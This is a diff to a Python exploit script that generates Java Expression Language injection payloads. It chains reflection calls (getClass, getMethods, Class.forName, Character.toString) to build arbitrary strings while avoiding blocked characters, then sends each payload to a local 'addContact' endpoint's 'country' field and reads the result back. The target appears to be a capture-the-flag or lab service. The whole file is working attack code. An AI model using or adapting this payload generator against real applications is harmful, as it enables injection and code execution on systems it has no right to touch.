@@ -2,21 +2,33 @@ import requests
 import string
 import json
 from collections import OrderedDict
-from utils import Utils
+from utils import RequestHandler, Utils
 
-utils = Utils('http://localhost:1337/addContact', 'POST', 'country', '{}', '', True)
-
+reqHandler = RequestHandler('http://localhost:1337/addContact', 'POST', 'country', '{}', '', True)
+utils = Utils()
 class GenPayload:
     
     def __init__(self) -> None:
-        self.WORDLIST = ['java', '.', '(', ')']
+        self.WORDLIST = ['java', 'Char', 'char', '.', '(', ')']
         self.STARTING_SUBSTRING_TABLE = {}
-        self.ARRAY_CLASS = '[].getClass()'
-        self.CLASS_CLASS = self.ARRAY_CLASS + '.getClass()'
+        self.STRING_CLASS = '[].getClass().getClass().toString().getClass()'
+        self.CLASS_CLASS = self.STRING_CLASS + '.getClass()'
         self.FORNAME_METHOD_INDEX = 2
         self.ASC_toStringMethod_INDEX = 5
         self.LETTERS = string.ascii_letters
         self.SUBSTRING_TABLE = OrderedDict()
+        
+        self.GEN_NUM_METHOD = 'genNumArraySize'
+    
+    def genNum(self, num):
+        if hasattr(self, self.GEN_NUM_METHOD):
+            method = getattr(self, self.GEN_NUM_METHOD)
+            return method(num)
+        else:
+            raise Exception('Generate number method not found!')
+    
+    def genNumNatural(self, num):
+        return str(num)
     
     def genNumArraySize(self, num):
         """
@@ -70,10 +82,10 @@ class GenPayload:
         return '${' + content + '}'
     
     def getMethodIndexFromClass(self, classStr, index):
-        return f'{classStr}.getMethods()[{self.genNumArraySize(index)}]'
+        return f'{classStr}.getMethods()[{self.genNum(index)}]'
     
     def getDeclaredField(self, classStr, index):
-        indexNum = self.genNumArraySize(index)
+        indexNum = self.genNum(index)
         return f'{classStr}.getDeclaredFields()[{indexNum}]'
     
     def enrichSubstringTable(self, source, sourceIndex, str):
@@ -94,29 +106,36 @@ class GenPayload:
         """
         # String fields
         for i in range(10):
-            payload = f'{self.genEL(self.getDeclaredField(self.ARRAY_CLASS, i))}'
-            result = utils.getDataFromResponse(utils.sendPayload(payload))
+            payload = f'{self.genEL(self.getDeclaredField(self.STRING_CLASS, i))}'
+            randomPrefix = utils.randomString(length = 10)
+            randomSubfix = utils.randomString(length = 10)            
+            payload = f"{randomPrefix}{payload}{randomSubfix}"
+            result = reqHandler.getDataFromResponse(reqHandler.sendPayload(payload), randomPrefix, randomSubfix)
             self.enrichSubstringTable('stringFields', i, result)
 
         # String methods
         for i in range(80):
-            payload = f'{self.genEL(self.getMethodIndexFromClass(self.ARRAY_CLASS, i))}'
-            result = utils.getDataFromResponse(utils.sendPayload(payload))
+            payload = f'{self.genEL(self.getMethodIndexFromClass(self.STRING_CLASS, i))}'
+            randomPrefix = utils.randomString(length = 10)
+            randomSubfix = utils.randomString(length = 10)            
+            payload = f"{randomPrefix}{payload}{randomSubfix}"
+            result = reqHandler.getDataFromResponse(reqHandler.sendPayload(payload), randomPrefix, randomSubfix)
             self.enrichSubstringTable('stringMethods', i, result)
             
     def genSubstring(self, object, indexStart, indexEnd):
-        return f'{object}.toString().substring({self.genNumArraySize(indexStart)}, {self.genNumArraySize(indexEnd)})' 
+        return f'{object}.toString().substring({self.genNum(indexStart)},{self.genNum(indexEnd)})' 
     
     def genWord(self, word):
         if word not in self.WORDLIST:
             return "null"
-        
-        source, sourceIndex, indexStart, indexEnd = self.SUBSTRING_TABLE[word]
-
+        try:
+            source, sourceIndex, indexStart, indexEnd = self.SUBSTRING_TABLE[word]
+        except KeyError:
+            return self.genASCToString(ord(word))
         if source == 'stringFields':
-            object = self.getDeclaredField(self.ARRAY_CLASS, sourceIndex)
+            object = self.getDeclaredField(self.STRING_CLASS, sourceIndex)
         else:
-            object = self.getMethodIndexFromClass(self.ARRAY_CLASS, sourceIndex)
+            object = self.getMethodIndexFromClass(self.STRING_CLASS, sourceIndex)
 
         return self.genSubstring(object, indexStart, indexEnd)
     
@@ -143,7 +162,7 @@ class GenPayload:
     def genASCToString(self, asc):
         characterClass = self.genClassForname('java.lang.Character')
         toStringMethod = self.getMethodIndexFromClass(characterClass, self.ASC_toStringMethod_INDEX)
-        ascNumber = self.genNumArraySize(asc)
+        ascNumber = self.genNum(asc)
 
         return f'{toStringMethod}.invoke(null, {ascNumber})'
 
@@ -198,4 +217,4 @@ class GenPayload:
                 
 genPayload = GenPayload()
 genPayload.initialize()
-print(genPayload.genString('shiba'))
+print(genPayload.genString('java'))
